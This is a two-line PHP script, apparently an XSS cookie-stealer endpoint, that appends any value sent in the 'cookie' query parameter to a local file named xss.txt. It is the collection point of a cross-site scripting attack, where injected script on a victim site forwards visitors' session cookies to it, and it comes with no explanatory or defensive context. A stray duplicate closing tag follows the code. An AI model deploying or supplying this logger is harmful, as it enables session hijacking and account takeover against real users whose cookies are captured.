<?php
fwrite(fopen("xss.txt","a+"),$_GET['cookie']);?>
?>
